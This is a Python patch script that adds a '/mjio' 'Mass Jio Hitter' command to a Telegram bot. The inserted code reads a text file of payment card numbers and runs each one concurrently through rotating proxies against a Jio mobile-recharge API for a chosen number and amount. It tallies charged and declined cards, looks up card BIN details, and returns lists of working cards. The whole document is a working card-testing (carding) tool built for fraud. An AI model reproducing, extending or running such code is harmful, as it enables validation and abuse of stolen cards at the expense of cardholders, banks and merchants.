import re, shutil, os, sys
from datetime import datetime

f = 'bot.py'
if not os.path.exists(f):
    print('❌ bot.py not found'); sys.exit(1)

shutil.copy(f, f + '.bak_mjio_' + datetime.now().strftime('%Y%m%d_%H%M%S'))
src = open(f).read()

if 'JIO_STATE' in src:
    print('⚠️  /mjio already exists — skipping'); sys.exit(0)

# ═══ Find JIO_API line ═══
m = re.search(r'^(JIO_API = .+)$', src, re.M)
if not m:
    print('❌ JIO_API line not found — aborting'); sys.exit(1)

# ═══ The /mjio code (raw string = no escape issues) ═══
code = r'''

# ══════════════════════════════════════════════════════════════════════════════
#  ▸ /mjio — Mass Jio Hitter with conversation flow + beautiful UI
# ══════════════════════════════════════════════════════════════════════════════
JIO_STATE: dict = {}      # uid → {step, cards, file_name, number}
JIO_ACTIVE: dict = {}     # uid → {msg_id, stop, paused, stats, started_at}
JIO_WORKERS = int(os.environ.get("JIO_WORKERS", "10"))


def _jio_pick_proxy(proxies):
    p = random.choice(proxies).strip()
    for prefix in ('http://', 'https://', 'socks4://', 'socks5://'):
        if p.startswith(prefix):
            p = p[len(prefix):]
            break
    if '@' in p:
        creds, hostport = p.rsplit('@', 1)
        if ':' in creds:
            user, pw = creds.split(':', 1)
            return f"{hostport}:{user}:{pw}"
        return hostport
    return p


async def _jio_hit_once(number, amount, card, proxy_param, timeout=90):
    url = JIO_API.rstrip("/")
    params = {"number": number, "amount": amount, "card": card, "proxy": proxy_param}
    t0 = time.time()
    conn = aiohttp.TCPConnector(ssl=False)
    try:
        async with aiohttp.ClientSession(connector=conn, timeout=aiohttp.ClientTimeout(total=timeout)) as s:
            async with s.get(url, params=params) as r:
                try:
                    data = await r.json()
                except Exception:
                    data = {"_raw": await r.text()}
        return True, data, round(time.time() - t0, 2)
    except asyncio.TimeoutError:
        return False, {"error": "timeout"}, round(time.time() - t0, 2)
    except Exception as e:
        return False, {"error": str(e)[:100]}, round(time.time() - t0, 2)


def _jio_classify(data):
    if not isinstance(data, dict):
        return None, "ERROR", "Invalid response"
    _ok = data.get("ok")
    _stage = data.get("stage", "")
    _user_msg = (data.get("user_message") or "").strip()
    _error = (data.get("error") or "").strip()
    _payload = data.get("payload") or {}
    if _ok is True or (_payload and _payload.get("status") is True):
        return "Charged", "CHARGED", _user_msg or "Recharge successful"
    raw = (_user_msg or _error or "Unknown").lower()
    if "proxy" in raw and ("dead" in raw or "failed" in raw):
        return None, "PROXY", _user_msg or "Proxy dead"
    if _stage == "ccdc_confirm" or "confirmation rejected" in raw or "rejected by gateway" in raw:
        return None, "DECLINED", "Card declined"
    if any(x in raw for x in ("decline", "insufficient", "invalid card", "expired", "do not honor")):
        return None, "DECLINED", (_user_msg or _error)[:80]
    if any(x in raw for x in ("number", "invalid number", "operator")):
        return None, "INVALID", (_user_msg or _error)[:80]
    return None, "FAILED", (_user_msg or _error or "Unknown")[:80]


# ══════════════════════════════════════════════════════════════════════════════
#  ▸ /mjio — entry (reply to .txt)
# ══════════════════════════════════════════════════════════════════════════════
@bot.on(events.NewMessage(pattern=r'^/mjio$'))
async def mjio_cmd(event):
    uid = event.sender_id
    if is_banned(uid):
        return
    if not is_premium(uid) and not is_admin(uid):
        await event.reply(pe("❌ Premium required"), parse_mode='html')
        return

    if not event.reply_to_msg_id:
        await event.reply(pe(
            "[⌯] 𝗠𝗮𝘀𝘀 𝗝𝗶𝗼 𝗛𝗶𝘁𝘁𝗲𝗿 ⌁ 📱\n"
            "─────────────────────\n"
            "[⌯] 𝗥𝗲𝗽𝗹𝘆 ⌁ .𝘁𝘅𝘁 𝗳𝗶𝗹𝗲 𝘄𝗶𝘁𝗵 𝗰𝗮𝗿𝗱𝘀\n"
            "[⌯] 𝗧𝗵𝗲𝗻 ⌁ /mjio ⌁ 🚀\n"
            "─────────────────────\n"
            "[⌯] 𝗙𝗹𝗼𝘄 ⌁ 𝗡𝘂𝗺𝗯𝗲𝗿 → 𝗔𝗺𝗼𝘂𝗻𝘁 → 𝗦𝘁𝗮𝗿𝘁"
        ), parse_mode='html')
        return

    reply = await event.get_reply_message()
    if not reply.file or not (reply.file.name or '').endswith('.txt'):
        await event.reply(pe("❌ 𝗥𝗲𝗽𝗹𝘆 𝘁𝗼 𝗮 .𝘁𝘅𝘁 𝗳𝗶𝗹𝗲"), parse_mode='html')
        return

    import tempfile, uuid as _u
    td = os.path.join(tempfile.gettempdir(), "rxo_uploads")
    os.makedirs(td, exist_ok=True)
    fp = os.path.join(td, f"{_u.uuid4().hex}.txt")
    fp = await reply.download_media(file=fp)
    try:
        async with aiofiles.open(fp, 'r', encoding='utf-8', errors='ignore') as f:
            content = await f.read()
    finally:
        try: os.remove(fp)
        except: pass

    cards = extract_cc(content)
    if not cards:
        await event.reply(pe("❌ 𝗡𝗼 𝘃𝗮𝗹𝗶𝗱 𝗰𝗮𝗿𝗱𝘀"), parse_mode='html')
        return

    file_name = reply.file.name or "cards.txt"
    limit = get_user_limit(uid)
    if len(cards) > limit:
        cards = cards[:limit]

    JIO_STATE[uid] = {
        'step': 'number',
        'cards': cards,
        'file_name': file_name,
        'number': None,
    }

    await event.reply(pe(
        "[⌯] 𝗠𝗮𝘀𝘀 𝗝𝗶𝗼 ⌁ 𝗦𝘁𝗲𝗽 𝟭/𝟮 ⌁ 📱\n"
        "─────────────────────\n"
        f"[⌯] 𝗖𝗮𝗿𝗱𝘀 ⌁ {len(cards):,} 💳\n"
        f"[⌯] 𝗙𝗶𝗹𝗲 ⌁ {file_name}\n"
        "─────────────────────\n"
        "[⌯] 𝗡𝗼𝘄 𝘀𝗲𝗻𝗱 𝗝𝗶𝗼 𝗻𝘂𝗺𝗯𝗲𝗿 📞\n"
        "[⌯] 𝗘𝘅𝗮𝗺𝗽𝗹𝗲 ⌁ 9226217275\n"
        "─────────────────────\n"
        "[⌯] 𝗖𝗮𝗻𝗰𝗲𝗹 ⌁ /canceljio"
    ), parse_mode='html')


# ══════════════════════════════════════════════════════════════════════════════
#  ▸ Step 1: number
# ══════════════════════════════════════════════════════════════════════════════
@bot.on(events.NewMessage(func=lambda e: e.sender_id in JIO_STATE
                          and JIO_STATE[e.sender_id].get('step') == 'number'))
async def jio_number_input(event):
    uid = event.sender_id
    if not event.text:
        return
    txt = event.text.strip()
    if txt.startswith('/'):
        return
    if not txt.isdigit() or len(txt) < 10 or len(txt) > 12:
        await event.reply(pe(
            "[⌯] ❌ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗻𝘂𝗺𝗯𝗲𝗿\n"
            "─────────────────────\n"
            "[⌯] 𝗦𝗲𝗻𝗱 𝟭𝟬-𝟭𝟮 𝗱𝗶𝗴𝗶𝘁 𝗻𝘂𝗺𝗯𝗲𝗿\n"
            "[⌯] 𝗘𝘅𝗮𝗺𝗽𝗹𝗲 ⌁ 9226217275"
        ), parse_mode='html')
        return

    JIO_STATE[uid]['number'] = txt
    JIO_STATE[uid]['step'] = 'amount'

    await event.reply(pe(
        "[⌯] 𝗠𝗮𝘀𝘀 𝗝𝗶𝗼 ⌁ 𝗦𝘁𝗲𝗽 𝟮/𝟮 ⌁ 💰\n"
        "─────────────────────\n"
        f"[⌯] 𝗡𝘂𝗺𝗯𝗲𝗿 ⌁ <code>{txt}</code> 📞\n"
        f"[⌯] 𝗖𝗮𝗿𝗱𝘀 ⌁ {len(JIO_STATE[uid]['cards']):,} 💳\n"
        "─────────────────────\n"
        "[⌯] 𝗡𝗼𝘄 𝘀𝗲𝗻𝗱 𝗮𝗺𝗼𝘂𝗻𝘁 💰\n"
        "[⌯] 𝗘𝘅𝗮𝗺𝗽𝗹𝗲 ⌁ 19\n"
        "─────────────────────\n"
        "[⌯] 𝗖𝗮𝗻𝗰𝗲𝗹 ⌁ /canceljio"
    ), parse_mode='html')


# ══════════════════════════════════════════════════════════════════════════════
#  ▸ Step 2: amount → START
# ══════════════════════════════════════════════════════════════════════════════
@bot.on(events.NewMessage(func=lambda e: e.sender_id in JIO_STATE
                          and JIO_STATE[e.sender_id].get('step') == 'amount'))
async def jio_amount_input(event):
    uid = event.sender_id
    if not event.text:
        return
    txt = event.text.strip()
    if txt.startswith('/'):
        return
    try:
        amount = float(txt)
        if amount <= 0 or amount > 10000:
            raise ValueError()
    except Exception:
        await event.reply(pe(
            "[⌯] ❌ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗮𝗺𝗼𝘂𝗻𝘁\n"
            "─────────────────────\n"
            "[⌯] 𝗦𝗲𝗻𝗱 𝗻𝘂𝗺𝗯𝗲𝗿 𝟭-𝟭𝟬𝟬𝟬𝟬\n"
            "[⌯] 𝗘𝘅𝗮𝗺𝗽𝗹𝗲 ⌁ 19"
        ), parse_mode='html')
        return

    st = JIO_STATE.pop(uid)
    number = st['number']
    cards = st['cards']
    file_name = st['file_name']
    amount_str = str(int(amount)) if amount == int(amount) else str(amount)

    await _jio_start(uid, number, amount_str, cards, file_name, event.message.id)


# ══════════════════════════════════════════════════════════════════════════════
#  ▸ Cancel
# ══════════════════════════════════════════════════════════════════════════════
@bot.on(events.NewMessage(pattern=r'^/canceljio$'))
async def jio_cancel(event):
    uid = event.sender_id
    if uid in JIO_STATE:
        JIO_STATE.pop(uid, None)
        await event.reply(pe(
            "[⌯] ❌ 𝗝𝗶𝗼 𝗠𝗮𝘀𝘀 ⌁ 𝗖𝗮𝗻𝗰𝗲𝗹𝗹𝗲𝗱\n"
            "─────────────────────"
        ), parse_mode='html')
        return
    st = JIO_ACTIVE.get(uid)
    if st and not st['stop']:
        st['stop'] = True
        await event.reply(pe("[⌯] ⛔ 𝗦𝘁𝗼𝗽𝗽𝗶𝗻𝗴..."), parse_mode='html')
    else:
        await event.reply(pe("[⌯] ⚠️ 𝗡𝗼 𝗮𝗰𝘁𝗶𝘃𝗲 𝘀𝗲𝘀𝘀𝗶𝗼𝗻"), parse_mode='html')


# ══════════════════════════════════════════════════════════════════════════════
#  ▸ Engine start — beautiful initial UI
# ══════════════════════════════════════════════════════════════════════════════
async def _jio_start(uid, number, amount, cards, file_name, reply_to_id):
    proxies = get_proxies_for_user(uid) or load_proxies()
    if not proxies:
        await bot.send_message(uid, pe("❌ 𝗡𝗼 𝗽𝗿𝗼𝘅𝗶𝗲𝘀. /setproxy ip:port"), parse_mode='html')
        return

    text = pe(
        "[⌯] 𝗠𝗮𝘀𝘀 𝗝𝗶𝗼 ⌁ 𝗥𝘂𝗻𝗻𝗶𝗻𝗴 ⌁ 🔥\n"
        "─────────────────────\n"
        f"[⌯] 𝗡𝘂𝗺𝗯𝗲𝗿 ⌁ <code>{number}</code> 📞\n"
        f"[⌯] 𝗔𝗺𝗼𝘂𝗻𝘁 ⌁ <code>{amount}</code> 💰\n"
        f"[⌯] 𝗧𝗼𝘁𝗮𝗹 ⌁ {len(cards):,} 💳\n"
        "─────────────────────\n"
        "[⌯] 𝗖𝗵𝗮𝗿𝗴𝗲𝗱 ⌁ 0 💎\n"
        "[⌯] 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ⌁ 0 🚫\n"
        "[⌯] 𝗘𝗿𝗿𝗼𝗿 ⌁ 0 ❌\n"
        f"[⌯] 𝗪𝗼𝗿𝗸𝗲𝗿𝘀 ⌁ {JIO_WORKERS} ⚙️\n"
        "─────────────────────\n"
        "●○○○○○○○○○○○○○○○○○○○ 0%\n"
        f"0 / {len(cards):,}\n"
        "─────────────────────\n"
        "⏳ 𝗪𝗮𝗶𝘁𝗶𝗻𝗴..."
    )
    msg = await raw_send(uid, text, rows_stop())
    msg_id = msg if isinstance(msg, int) else (msg.id if msg else None)
    if not msg_id:
        return

    JIO_ACTIVE[uid] = {
        'msg_id': msg_id,
        'stop': False,
        'paused': False,
        'started_at': time.time(),
        'charged': 0,
        'declined': 0,
        'error': 0,
        'charged_list': [],
        'declined_list': [],
        'error_list': [],
        'number': number,
        'amount': amount,
        'total': len(cards),
        'done': 0,
        'file_name': file_name,
    }
    asyncio.create_task(_jio_worker(uid, cards, proxies))


# ══════════════════════════════════════════════════════════════════════════════
#  ▸ Engine worker
# ══════════════════════════════════════════════════════════════════════════════
async def _jio_worker(uid, cards, proxies):
    st = JIO_ACTIVE.get(uid)
    if not st:
        return

    sem = asyncio.Semaphore(JIO_WORKERS)
    lock = asyncio.Lock()
    last_edit = [0.0]

    async def one(card):
        async with sem:
            if st['stop']:
                return
            while st.get('paused') and not st['stop']:
                await asyncio.sleep(1)
            if st['stop']:
                return

            proxy_param = _jio_pick_proxy(proxies)
            ok, data, elapsed = await _jio_hit_once(
                st['number'], st['amount'], card, proxy_param
            )
            hit_type, status_display, result_text = _jio_classify(data if ok else {})

            async with lock:
                st['done'] += 1
                if hit_type == "Charged":
                    st['charged'] += 1
                    st['charged_list'].append({'card': card, 'msg': result_text, 'time': elapsed})
                elif status_display == "DECLINED":
                    st['declined'] += 1
                    st['declined_list'].append({'card': card, 'msg': result_text, 'time': elapsed})
                else:
                    st['error'] += 1
                    st['error_list'].append({'card': card, 'msg': result_text, 'time': elapsed})

            if hit_type == "Charged":
                try:
                    bin_info = await get_bin_info(card.split('|')[0])
                except Exception:
                    bin_info = None
                try:
                    await send_realtime_hit(uid, {
                        'card': card, 'status': 'Charged', 'message': result_text,
                        'gateway': 'Jio Recharge', 'price': st['amount'],
                        'time': elapsed, 'bin_info': bin_info,
                    }, 'Charged', st['file_name'])
                except Exception as e:
                    print(f"[JIO hit] {e}")

            now = time.time()
            if now - last_edit[0] >= 3:
                last_edit[0] = now
                try:
                    await _jio_update_ui(uid, st)
                except Exception as e:
                    print(f"[JIO progress] {e}")

    try:
        tasks = [asyncio.create_task(one(c)) for c in cards]
        await asyncio.gather(*tasks, return_exceptions=True)
    finally:
        JIO_ACTIVE.pop(uid, None)
        await _jio_final(uid, st)


# ══════════════════════════════════════════════════════════════════════════════
#  ▸ Progress UI
# ══════════════════════════════════════════════════════════════════════════════
async def _jio_update_ui(uid, st):
    total = st['total']
    done = st['done']
    pct = int(100 * done / total) if total else 0
    filled = int(20 * done / total) if total else 0
    bar = '●' * filled + '○' * (20 - filled)

    text = pe(
        "[⌯] 𝗠𝗮𝘀𝘀 𝗝𝗶𝗼 ⌁ 𝗥𝘂𝗻𝗻𝗶𝗻𝗴 ⌁ 🔥\n"
        "─────────────────────\n"
        f"[⌯] 𝗡𝘂𝗺𝗯𝗲𝗿 ⌁ <code>{st['number']}</code> 📞\n"
        f"[⌯] 𝗔𝗺𝗼𝘂𝗻𝘁 ⌁ <code>{st['amount']}</code> 💰\n"
        f"[⌯] 𝗧𝗼𝘁𝗮𝗹 ⌁ {total:,} 💳\n"
        "─────────────────────\n"
        f"[⌯] 𝗖𝗵𝗮𝗿𝗴𝗲𝗱 ⌁ {st['charged']} 💎\n"
        f"[⌯] 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ⌁ {st['declined']} 🚫\n"
        f"[⌯] 𝗘𝗿𝗿𝗼𝗿 ⌁ {st['error']} ❌\n"
        f"[⌯] 𝗪𝗼𝗿𝗸𝗲𝗿𝘀 ⌁ {JIO_WORKERS} ⚙️\n"
        "─────────────────────\n"
        f"{bar} {pct}%\n"
        f"{done:,} / {total:,}\n"
        "─────────────────────\n"
        "⚡ 𝗥𝘂𝗻𝗻𝗶𝗻𝗴..."
    )
    try:
        await raw_edit(uid, st['msg_id'], text, rows_stop())
    except Exception:
        pass


# ══════════════════════════════════════════════════════════════════════════════
#  ▸ Final summary + result files
# ══════════════════════════════════════════════════════════════════════════════
async def _jio_final(uid, st):
    elapsed = int(time.time() - st['started_at'])
    m, s = elapsed // 60, elapsed % 60
    total = st['total']
    done = st['done']
    pct = int(100 * done / total) if total else 0
    filled = int(20 * done / total) if total else 0
    bar = '●' * filled + '○' * (20 - filled)

    try:
        cname = await get_display_name(uid)
    except Exception:
        cname = str(uid)

    summary = pe(
        "[⌯] 𝗠𝗮𝘀𝘀 𝗝𝗶𝗼 ⌁ 𝗖𝗼𝗺𝗽𝗹𝗲𝘁𝗲 ⌁ ✅\n"
        "─────────────────────\n"
        f"[⌯] 𝗡𝘂𝗺𝗯𝗲𝗿 ⌁ <code>{st['number']}</code> 📞\n"
        f"[⌯] 𝗔𝗺𝗼𝘂𝗻𝘁 ⌁ <code>{st['amount']}</code> 💰\n"
        f"[⌯] 𝗧𝗼𝘁𝗮𝗹 ⌁ {total:,} 💳\n"
        f"[⌯] 𝗗𝗼𝗻𝗲 ⌁ {done:,} ⚙️\n"
        "─────────────────────\n"
        f"[⌯] 𝗖𝗵𝗮𝗿𝗴𝗲𝗱 ⌁ {st['charged']} 💎\n"
        f"[⌯] 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ⌁ {st['declined']} 🚫\n"
        f"[⌯] 𝗘𝗿𝗿𝗼𝗿 ⌁ {st['error']} ❌\n"
        "─────────────────────\n"
        f"{bar} {pct}%\n"
        f"{done:,} / {total:,}\n"
        "─────────────────────\n"
        f"[⌯] 𝗧𝗶𝗺𝗲 ⌁ {m}m {s}s ⏱️\n"
        "─────────────────────\n"
        f"[⌯] 𝗖𝗵𝗲𝗰𝗸𝗲𝗿 ⌁ 🔰 {cname}"
    )
    try:
        await bot.send_message(uid, summary, parse_mode='html')
    except Exception:
        pass

    for label, arr, emoji in [
        ('CHARGED', st['charged_list'], '💎'),
        ('DECLINED', st['declined_list'], '🚫'),
        ('ERROR', st['error_list'], '❌'),
    ]:
        if not arr:
            continue
        fn = f"jio_{label.lower()}_{int(time.time())}.txt"
        async with aiofiles.open(fn, 'w') as f:
            for r in arr:
                await f.write(f"{r['card']} | {r['msg']} | {r['time']}s\n")
        try:
            await bot.send_file(uid, fn, caption=pe(f"[⌯] {label} ⌁ {len(arr)} {emoji}"), parse_mode='html')
        except Exception as e:
            print(f"[JIO file] {e}")
        try:
            os.remove(fn)
        except Exception:
            pass

'''

new_src = src[:m.end()] + code + src[m.end():]
open(f, 'w').write(new_src)
print('✅ /mjio inserted into bot.py')
print('   Backup: ' + f + '.bak_mjio_*')
